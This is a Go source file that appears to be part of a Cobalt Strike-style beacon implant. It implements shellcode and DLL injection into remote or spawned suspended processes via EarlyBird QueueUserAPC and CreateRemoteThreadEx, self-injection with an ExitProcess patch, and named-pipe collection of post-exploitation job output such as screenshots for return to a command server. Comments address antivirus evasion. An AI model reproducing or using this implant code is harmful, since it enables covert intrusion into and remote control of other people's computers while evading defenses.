//go:build windows

package command

import (
	"bytes"
	"errors"
	"github.com/Microsoft/go-winio"
	"golang.org/x/sys/windows"
	"io"
	"main/config"
	"main/packet"
	"main/sysinfo"
	"main/util"
	"strings"
	"time"
	"unsafe"
)

// use windows packet as much as possible
var (
	kernel32                = windows.NewLazySystemDLL("kernel32.dll")
	ntdll                   = windows.NewLazyDLL("ntdll.dll")
	advapi32                = windows.NewLazyDLL("Advapi32.dll")
	virtualAllocEx          = kernel32.NewProc("VirtualAllocEx")
	virtualProtectEx        = kernel32.NewProc("VirtualProtectEx")
	createRemoteThreadEx    = kernel32.NewProc("CreateRemoteThreadEx")
	queueUserAPC            = kernel32.NewProc("QueueUserAPC")
	createThread            = kernel32.NewProc("CreateThread")
	peekNamedPipe           = kernel32.NewProc("PeekNamedPipe")
	getFileTime             = kernel32.NewProc("GetFileTime")
	rtlCopyMemory           = ntdll.NewProc("RtlCopyMemory")
	createProcessWithLogonW = advapi32.NewProc("CreateProcessWithLogonW")
	createProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
	adjustTokenPrivileges   = advapi32.NewProc("AdjustTokenPrivileges")
	impersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	logonUserA              = advapi32.NewProc("LogonUserA")
)

type job struct {
	jid         int
	pid         uint32 // just records pid, has nothing to do with job control
	description string
	pipeName    string
	sleepTime   uint16
	stopCh      chan bool
}

var jobs []job
var jobCnt = 0

// spawn and inject get thread/process id, but we need it in handleJob
var currentPid uint32 = 0

// implement of beacon.Job
func InjectDll(b []byte, isDllX64 bool) error {
	pid, dll, offset, _ := parseInject(b)
	var isProcessX64 = true
	if sysinfo.GetProcessArch(pid) != sysinfo.ProcessArch64 {
		isProcessX64 = false
	}
	if isDllX64 != isProcessX64 {
		return errors.New("dll and process arch didn't equal")
	}
	currentProcessId := windows.GetCurrentProcessId()
	if pid == currentProcessId {
		currentPid = pid
		err := injectSelf(dll, offset, nil)
		if err != nil {
			currentPid = 0
		}
		return err
	} else {
		processHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, true, pid)
		if err != nil {
			currentPid = 0
			return errors.New(util.Sprintf("OpenProcess error: %s", err))
		}
		currentPid = pid
		//return createRemoteThread(processHandle, dll, 0, nil)

		// callUserAPC deploy
		threadIds := listThread(pid)
		threadHandle, err := windows.OpenThread(0, false, threadIds[0])
		if err != nil {
			// use currentPid = 0 to indicate error
			currentPid = 0
			return err
		}
		defer windows.CloseHandle(threadHandle)
		defer windows.CloseHandle(processHandle)
		return callUserAPC(processHandle, threadHandle, dll, offset)
	}
}

func listThread(pid uint32) []uint32 {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, pid)
	if err != nil {
		return nil
	}
	defer windows.CloseHandle(snapshot)
	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	err = windows.Thread32First(snapshot, &te)
	var threadId []uint32
	for err != windows.ERROR_NO_MORE_FILES {
		if te.OwnerProcessID == pid {
			threadId = append(threadId, te.ThreadID)
			util.Println(te.ThreadID)
		}
		err = windows.Thread32Next(snapshot, &te)
	}
	return threadId
}

// you should ensure x86 shellcode inject to x86 process
func getSpawnProcessX86() (string, string) {
	var arr []string
	if sysinfo.IsProcessX64() {
		path := config.SpawnToX86
		arr = strings.SplitN(path, " ", 2)
	} else {
		path := strings.Replace(config.SpawnToX86, "syswow64", "system32", 1)
		arr = strings.SplitN(path, " ", 2)
	}
	program := arr[0]
	args := ""
	if len(arr) > 1 {
		args = arr[1]
	}
	return program, args
}

func getSpawnProcessX64() (string, string) {
	var arr []string
	if sysinfo.IsProcessX64() {
		path := strings.Replace(config.SpawnToX64, "sysnative", "system32", 1)
		arr = strings.SplitN(path, " ", 2)
	} else {
		path := config.SpawnToX64
		arr = strings.SplitN(path, " ", 2)
	}
	program := arr[0]
	args := ""
	if len(arr) > 1 {
		args = arr[1]
	}
	return program, args
}

func spawnTempProcess(procInfo *windows.ProcessInformation, startupInfo *windows.StartupInfo, isX64 bool, ignoreToken bool) error {
	var program, args string
	if isX64 {
		program, args = getSpawnProcessX64()
	} else {
		program, args = getSpawnProcessX86()
	}

	errCreateProcess := createProcessNative(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo, ignoreToken)
	if errCreateProcess != nil && errCreateProcess != windows.SEVERITY_SUCCESS {
		currentPid = 0
		return errors.New(util.Sprintf("CreateProcess error: %s", errCreateProcess.Error()))
	}
	return nil
}

func SpawnAndInjectDll(dll []byte, isDllX64 bool, ignoreToken bool) error {
	if config.InjectSelf {
		currentPid = windows.GetCurrentProcessId()
		err := injectSelf(dll, 0, nil)
		if err != nil {
			currentPid = 0
		}
		return err
	} else {
		procInfo := &windows.ProcessInformation{}
		// seems dwCreateFlag value cannot be put at here
		startupInfo := &windows.StartupInfo{
			Flags:      windows.STARTF_USESTDHANDLES,
			ShowWindow: 1,
		}
		err := spawnTempProcess(procInfo, startupInfo, isDllX64, ignoreToken)
		if err != nil {
			currentPid = 0
			return err
		}
		currentPid = procInfo.ProcessId
		defer windows.CloseHandle(procInfo.Process)
		defer windows.CloseHandle(procInfo.Thread)
		return callUserAPC(procInfo.Process, procInfo.Thread, dll, 0)
		// createRemoteThread can be easily caught, you should never use it
		//return createRemoteThread(procInfo.Process, dll, 0, nil)
	}
}

// copy from GolangBypassAV EarlyBird
func callUserAPC(processHandle windows.Handle, threadHandle windows.Handle, shellcode []byte, offset uint32) error {
	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
		return errors.New(util.Sprintf("VirtualAlloc error: %s", errVirtualAlloc))
	}
	var length uintptr
	errWriteProcessMemory := windows.WriteProcessMemory(processHandle, addr, &shellcode[0], uintptr(len(shellcode)), &length)
	if errWriteProcessMemory != nil {
		return errors.New(util.Sprintf("WriteProcessMemory error: %s", errWriteProcessMemory))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(processHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
		return errors.New(util.Sprintf("VirtualProtectEx error: %s", errVirtualProtectEx))
	}
	_, _, err := queueUserAPC.Call(addr+uintptr(offset), uintptr(threadHandle), 0)
	if err != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
		return errors.New(util.Sprintf("QueueUserAPC error: %s", err))
	}
	_, errResumeThread := windows.ResumeThread(threadHandle)
	if errResumeThread != nil {
		return errors.New(util.Sprintf("ResumeThread error: %s", errResumeThread))
	}
	return nil
}

func createRemoteThread(processHandle windows.Handle, shellcode []byte, offset uint32, args []byte) error {
	var argsAddr uintptr = 0
	if args != nil {
		var errVirtualAlloc error
		argsAddr, _, errVirtualAlloc = virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(args)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

		if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
			return errors.New(util.Sprintf("VirtualAllocEx error: %s", errVirtualAlloc))
		}

		if argsAddr == 0 {
			return errors.New("[!]VirtualAllocEx failed and returned 0")
		}
		var writtenBytes uintptr
		errWriteProcessMemory := windows.WriteProcessMemory(processHandle, argsAddr, &args[0], uintptr(len(args)), &writtenBytes)

		if errWriteProcessMemory != nil && errWriteProcessMemory != windows.SEVERITY_SUCCESS {
			return errors.New(util.Sprintf("[!]Error calling WriteProcessMemory: %s", errWriteProcessMemory))
		}
	}

	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
		return errors.New(util.Sprintf("VirtualAllocEx error: %s", errVirtualAlloc))
	}

	if addr == 0 {
		return errors.New("[!]VirtualAllocEx failed and returned 0")
	}
	var writtenBytes uintptr
	errWriteProcessMemory := windows.WriteProcessMemory(processHandle, addr, &shellcode[0], uintptr(len(shellcode)), &writtenBytes)

	if errWriteProcessMemory != nil && errWriteProcessMemory != windows.SEVERITY_SUCCESS {
		return errors.New(util.Sprintf("[!]Error calling WriteProcessMemory: %s", errWriteProcessMemory))
	}

	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(processHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
		return errors.New(util.Sprintf("Error calling VirtualProtectEx: %s", errVirtualProtectEx))
	}
	// offset is the shellcode prepends in c2profile
	_, _, errCreateRemoteThreadEx := createRemoteThreadEx.Call(uintptr(processHandle), 0, 0, addr+uintptr(offset), argsAddr, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx != windows.SEVERITY_SUCCESS {
		return errors.New(util.Sprintf("[!]Error calling CreateRemoteThreadEx: %s", errCreateRemoteThreadEx))
	}
	return nil
}

func injectSelf(shellcode []byte, offset uint32, args []byte) error {
	// patch dll's ExitProcess to ExitThread
	// it's quite strange that I can just change the func name to patch it
	shellcode = bytes.ReplaceAll(shellcode, []byte("ExitProcess"), []byte("ExitThread\x00"))
	var argsAddr uintptr = 0
	if args != nil {
		var err error
		argsAddr, err = windows.VirtualAlloc(0, uintptr(len(args)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
		if err != nil {
			return errors.New(util.Sprintf("VirtualAlloc Error: %s", err))
		}
		// invalidHandle represent self
		var bytesWritten uintptr
		err = windows.WriteProcessMemory(windows.InvalidHandle, argsAddr, &args[0], uintptr(len(args)), &bytesWritten)
		if err != nil {
			return errors.New(util.Sprintf("WriteProcessMemory Error: %s", err))
		}
	}

	addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
	if err != nil {
		return errors.New(util.Sprintf("VirtualAlloc Error: %s", err))
	}
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(windows.InvalidHandle, addr, &shellcode[0], uintptr(len(shellcode)), &bytesWritten)
	if err != nil {
		return errors.New(util.Sprintf("WriteProcessMemory Error: %s", err))
	}
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		return errors.New(util.Sprintf("VirtualProtect Error: %s", err))
	}
	var threadId uint32
	_, _, err = createThread.Call(0, 0, addr+uintptr(offset), argsAddr, 0, uintptr(threadId))
	if err != nil && err != windows.SEVERITY_SUCCESS {
		return errors.New(util.Sprintf("CreateThread Error: %s", err))
	}
	return nil
}

func HandlerJobAsync(b []byte) error {
	buf := bytes.NewBuffer(b)
	// inject it gives pid, spawn it gives zero
	// pid
	_ = packet.ReadInt(buf)
	callbackType := packet.ReadShort(buf)
	sleepTime := packet.ReadShort(buf)
	pipeName, _ := parseAnArg(buf)
	// when in 4.1+, pipeName will always be 57 bytes length padding with 0, I need to remove it manually
	pipeName = bytes.TrimRight(pipeName, "\x00")
	commandType, _ := parseAnArg(buf)
	if currentPid == 0 {
		return nil
	}
	stopCh := make(chan bool, 1)
	j := job{
		jid:         jobCnt,
		pid:         currentPid,
		description: string(commandType),
		pipeName:    string(pipeName),
		stopCh:      stopCh,
		sleepTime:   sleepTime,
	}
	jobCnt++
	jobs = append(jobs, j)

	go func() {
		result, err := readNamedPipe(j)
		if err != nil {
			packet.ErrorMessage(err.Error())
			removeJob(j.jid)
			return
		}
		// job name in 4.0 and 4.1+ is also different, so use callback type is more wisely
		switch callbackType {
		case packet.CALLBACK_SCREENSHOT:
			// take screenshot will have 4 bytes to indicate the data length, but server doesn't deal with it
			result = result[4:]
		default:
		}
		packet.PushResult(int(callbackType), []byte(result))
		removeJob(j.jid)
	}()
	return nil
}

func ListJobs() error {
	result := ""
	for _, job := range jobs {
		result += util.Sprintf("%d\t%d\t%s\n", job.jid, job.pid, job.description)
	}
	packet.PushResult(packet.CALLBACK_LIST_JOBS, []byte(result))
	return nil
}

func KillJob(b []byte) error {
	buf := bytes.NewBuffer(b)
	jid := packet.ReadShort(buf)
	for _, j := range jobs {
		if j.jid == int(jid) {
			// don't kill the process, just disconnect the pipe
			j.stopCh <- true
		}
	}
	return nil
}

func removeJob(jid int) {
	for i, job := range jobs {
		if job.jid == jid {
			jobs = append(jobs[:i], jobs[i+1:]...)
			return
		}
	}
}

func readNamedPipe(j job) (string, error) {
	pipe, err := winio.DialPipe(j.pipeName, nil)
	if err != nil {
		// try it twice in case of sleep time is too short
		time.Sleep(time.Millisecond * time.Duration(j.sleepTime))
		pipe, err = winio.DialPipe(j.pipeName, nil)
		if err != nil {
			return "", errors.New(util.Sprintf("DialPipe error: %s", err))
		}
	}
	defer pipe.Close()
	result := ""
	buf := make([]byte, 1024)
	for {
		select {
		case <-j.stopCh:
			return result + util.Sprintf("\njob %d canceled", j.jid), nil
		default:
			n, err := pipe.Read(buf)
			// if you kill the process, pipe will be closed and there will receive an EOF
			if err != nil {
				if err != io.EOF && err != windows.ERROR_PIPE_NOT_CONNECTED {
					return "", err
				}
				return result, nil
			}
			result += string(buf[:n])
		}
	}
}
